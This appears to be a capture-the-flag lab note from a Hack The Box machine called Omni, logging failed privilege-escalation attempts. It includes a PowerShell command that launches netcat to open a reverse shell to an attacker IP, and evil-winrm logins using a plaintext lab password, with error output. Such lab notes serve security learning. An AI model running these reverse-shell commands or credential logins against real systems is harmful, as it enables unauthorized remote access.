# Failed escalation to user app

Tried RunAs but couldn't work

```text
PS C:\Temp> Invoke-Command -ScriptBlock {C:\Temp\nc64.exe 10.10.14.78 443 -e powershell} -Credential $cred -Computer localhost
Invoke-Command -ScriptBlock {C:\Temp\nc64.exe 10.10.14.78 443 -e powershell} -Credential $cred -Computer localhost
[localhost] Connecting to remote server localhost failed with the following
error message : WinRM cannot process the request. The following error with
errorcode 0x8009030d occurred while using Negotiate authentication: A
specified logon session does not exist. It may already have been terminated.
 Possible causes are:
  -The user name or password specified are invalid.
  -Kerberos is used when no authentication method and no user name are
specified.
  -Kerberos accepts domain user names, but not local user names.
  -The Service Principal Name (SPN) for the remote computer name and port does
not exist.
  -The client and remote computers are in different domains and there is no
trust between the two domains.
 After checking for the above issues, try the following:
  -Check the Event Viewer for events related to authentication.
  -Change the authentication method; add the destination computer to the WinRM
TrustedHosts configuration setting or use HTTPS transport.
 Note that computers in the TrustedHosts list might not be authenticated.
   -For more information about WinRM configuration, run the following command:
winrm help config. For more information, see the about_Remote_Troubleshooting
Help topic.
    + CategoryInfo          : OpenError: (localhost:String) [], PSRemotingTran
   sportException
    + FullyQualifiedErrorId : 1312,PSSessionStateBroken
```

Secondly I tried winrm but it failed too

```text
root@kali:~/CTF/HTB/Omni/PE# evil-winrm -i 10.10.10.204 -u app -p "mesh5143"

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Sat, 06 Mar 2021 10:41:54 GMT", "Connection"=>"close", "Content-Length"=>"0"}
Body:  (404).

Error: Exiting with code 1

root@kali:~/CTF/HTB/Omni/PE# evil-winrm -i 10.10.10.204 -u 'omni\app' -p "mesh5143"

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Server"=>"Microsoft-HTTPAPI/2.0", "Date"=>"Sat, 06 Mar 2021 10:42:47 GMT", "Connection"=>"close", "Content-Length"=>"0"}
Body:  (404).

Error: Exiting with code 1
```

